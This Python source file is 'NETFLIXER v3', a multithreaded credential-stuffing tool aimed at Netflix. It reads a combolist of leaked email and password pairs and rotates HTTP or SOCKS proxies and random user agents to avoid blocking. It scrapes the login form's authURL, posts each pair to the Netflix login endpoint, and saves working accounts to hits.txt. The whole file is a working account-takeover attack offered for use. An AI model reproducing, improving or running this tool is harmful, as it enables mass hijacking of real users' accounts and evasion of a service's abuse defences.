import os,requests,random,threading,ctypes,time
from fake_useragent import UserAgent
from bs4 import BeautifulSoup as Soup

class Fore:
    YELLOW = '\033[93m'
    GREEN = '\033[32m'
    RED = '\033[91m'
    CYAN = '\033[36m'
    RESET = '\033[0m' 
    
lock = threading.Lock()
threads,proxies,combos,valid,invalid,cpm,check,proxytype = [],[],[],0,0,0,None,None

def cpm_counter():
    global cpm
    while True:
        old = valid
        time.sleep(4)
        new = valid
        cpm = (new-old) * 15

def update_title():
    while True:
        elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - start))
        ctypes.windll.kernel32.SetConsoleTitleW(f'[NETFLIXER v3] - Hits: {valid} | Bad: {invalid} | CPM: {cpm} | Threads: {threading.active_count() - 2} | Time elapsed: {elapsed}')
        time.sleep(0.4)

def banner():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[NETFLIXER v3] - Made by Plasmonix') 
    text = '''    
                      ███▄    █ ▓█████▄▄▄█████▓  █████▒██▓     ██▓▒██   ██▒▓█████  ██▀███  
                      ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒▓██   ▒▓██▒    ▓██▒▒▒ █ █ ▒░▓█   ▀ ▓██ ▒ ██▒
                     ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░▒████ ░▒██░    ▒██▒░░  █   ░▒███   ▓██ ░▄█ ▒
                     ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ ░▓█▒  ░▒██░    ░██░ ░ █ █ ▒ ▒▓█  ▄ ▒██▀▀█▄  
                     ▒██░   ▓██░░▒████▒ ▒██▒ ░ ░▒█░   ░██████▒░██░▒██▒ ▒██▒░▒████▒░██▓ ▒██▒
                     ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░    ▒ ░   ░ ▒░▓  ░░▓  ▒▒ ░ ░▓ ░░░ ▒░ ░░ ▒▓ ░▒▓░
                     ░ ░░   ░ ▒░ ░ ░  ░   ░     ░     ░ ░ ▒  ░ ▒ ░░░   ░▒ ░ ░ ░  ░  ░▒ ░ ▒░
                        ░   ░ ░    ░    ░       ░ ░     ░ ░    ▒ ░ ░    ░     ░     ░░   ░ 
                              ░    ░  ░                   ░  ░ ░   ░    ░     ░  ░   ░     '''
    
    faded = ''
    red = 40
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
        if not red == 255:
            red += 15
            if red > 255:
                red = 255
    print(faded)
    print(f'{Fore.YELLOW}                                     github.com/Plasmonix Version 3.0\n {Fore.RESET}')

def load_proxies():
    try:
        path = input(f'[{Fore.CYAN}*{Fore.RESET}] Path to proxy file> ')
        proxyfile = open(path, "r").readlines()

        choice = int(input(f'[{Fore.CYAN}?{Fore.RESET}] Proxy type [{Fore.CYAN}0{Fore.RESET}]HTTPS/[{Fore.CYAN}1{Fore.RESET}]SOCKS4/[{Fore.CYAN}2{Fore.RESET}]SOCKS5> '))
        if choice == 0:
            proxytype = 'https'                          
        elif choice == 1:
            proxytype = 'socks4'
        elif choice == 2:
            proxytype = 'socks5'
        else:
            print(Fore.RED+'[ERROR] Please enter a valid choice such as 0, 1 or 2!'+Fore.RESET)

        for proxy in proxyfile:
            ip = proxy.split(":")[0]
            port = proxy.split(":")[1]
            proxies.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})

    except FileNotFoundError:
           print(Fore.RED+'[ERROR] Failed to open proxyfile'+Fore.RESET)
           quit()

    except ValueError:
        print(Fore.RED+'[ERROR] Value must be an integer'+Fore.RESET)
        quit()

def worker(combos, thread_id):
    global check
    while check[thread_id] < len(combos):
        combination = combos[check[thread_id]].split(':')
        check_account(combination[0], combination[1])
        check[thread_id] += 1 

def check_account(email,password):
    global valid,invalid
    try:     
        client = requests.Session()
        proxy = random.choice(proxies)
        login = client.get("https://www.netflix.com/login")
        soup = Soup(login.text,'html.parser')
        loginForm = soup.find('form')
        authURL = loginForm.find('input', {'name': 'authURL'}).get('value')   
        
        headers = {
            "user-agent": UserAgent().random,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
            "accept-language": "en-US,en;q=0.9", 
            "accept-encoding": "gzip, deflate, br", 
            "referer": "https://www.netflix.com/login", 
            "content-type": "application/x-www-form-urlencoded",
            "cookie":""
        }
        data = {
            "userLoginId:": (email), 
            "password": (password), 
            "rememberMeCheckbox": "true", 
            "flow": "websiteSignUp", 
            "mode": "login", 
            "action": "loginAction", 
            "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode", 
            "authURL": (authURL), 
            "nextPage": "https://www.netflix.com/browse",
            "countryCode": "+1",
            "countryIsoCode": "US"
        }  
        
        request = client.post("https://www.netflix.com/login",headers=headers,data=data,proxies=proxy)
    
    except:
        print(Fore.RED+'[ERROR] Proxy timeout. Change your proxies or use a different VPN'+Fore.RESET)
        quit()

    logged = request.text.find('name="authURL"')
    if logged == -1:
        lock.acquire()
        print(Fore.GREEN+'[GOOD] '+email+':'+password+Fore.RESET)
        valid+=1
        file = open("hits.txt","a").write(email+":"+password+"\n")   
        lock.release()
    else:
        lock.acquire()
        print(Fore.RED+'[BAD] '+email+':'+password+Fore.RESET)
        invalid+=1
        lock.release()

if __name__ =='__main__':
    banner()
    load_proxies()
    try:
        path = input(f'[{Fore.CYAN}*{Fore.RESET}] Path to combolist> ')
        combolist = open(path, "r").readlines()        
        for combo in combolist:
            combos.append(combo.replace('\n', ''))           
        threadcount = int(input(f'[{Fore.CYAN}*{Fore.RESET}] Threads> '))
    
    except FileNotFoundError:
        print(Fore.RED+'[ERROR] Failed to open combolist'+Fore.RESET)
        quit()

    except ValueError:
        print(Fore.RED+'[ERROR] Value must be an integer'+Fore.RESET)
        quit() 

    os.system('cls')
    banner()
    start = time.time()
    threading.Thread(target=cpm_counter,daemon=True).start()
    threading.Thread(target=update_title,daemon=True).start() 

    check = [0 for i in range(threadcount)]
    for i in range(threadcount):
        sliced = combos[int(len(combos)/threadcount*i):int(len(combos)/threadcount*(i+1))]
        t = threading.Thread(target=worker,args=(sliced, i,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
